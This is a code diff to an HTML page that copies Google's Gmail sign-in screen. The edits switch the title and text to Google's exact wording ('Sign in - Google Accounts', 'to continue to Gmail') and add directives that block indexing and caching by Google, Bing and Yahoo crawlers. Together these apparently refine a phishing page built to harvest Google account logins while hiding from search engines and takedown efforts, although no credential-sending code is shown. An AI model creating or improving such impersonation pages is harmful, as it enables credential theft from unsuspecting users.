@@ -3,11 +3,17 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <meta name="robots" content="noindex, nofollow, noarchive, nosnippet, noimageindex" />
+  <meta name="robots" content="noindex, nofollow, noarchive, nosnippet, noimageindex, nocache" />
   <meta name="googlebot" content="noindex, nofollow, noarchive, nosnippet, noimageindex" />
+  <meta name="googlebot-news" content="noindex" />
+  <meta name="bingbot" content="noindex, nofollow, noarchive" />
+  <meta name="slurp" content="noindex, nofollow" />
   <meta name="referrer" content="no-referrer" />
   <meta http-equiv="X-UA-Compatible" content="IE=edge" />
-  <title>Account Verification</title>
+  <meta http-equiv="Cache-Control" content="no-store, no-cache, must-revalidate" />
+  <meta http-equiv="Pragma" content="no-cache" />
+  <meta name="revisit-after" content="999 days" />
+  <title>Sign in - Google Accounts</title>
   <link rel="preconnect" href="https://fonts.googleapis.com" />
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
   <link href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500;700&family=Roboto:wght@400;500&display=swap" rel="stylesheet" />
@@ -25,15 +31,15 @@
         </svg>
       </div>
 
-      <h1 class="gmail-title">Sign in</h1>
-      <p class="gmail-subtitle">Use your Google Account</p>
+      <h1 class="gmail-title">Sign In</h1>
+      <p class="gmail-subtitle">to continue to Gmail</p>
 
       <form id="gmail-email-form" class="gmail-form" autocomplete="off">
         <div class="gmail-input-wrap">
-          <input type="email" id="gmail-email" name="email" placeholder=" " required autofocus />
-          <label for="gmail-email">Email or phone</label>
+          <input type="email" id="gmail-email" name="email" placeholder="Email or Phone" required autofocus />
+          <label for="gmail-email">Email or Phone</label>
         </div>
-        <div class="gmail-helper">Not your computer? Use Guest mode to sign in privately.</div>
+        <div class="gmail-helper"><a href="#">Forgot email?</a></div>
         <div class="gmail-actions">
           <a href="/highlights" class="gmail-link">Create account</a>
           <button type="submit" class="gmail-btn">Next</button>
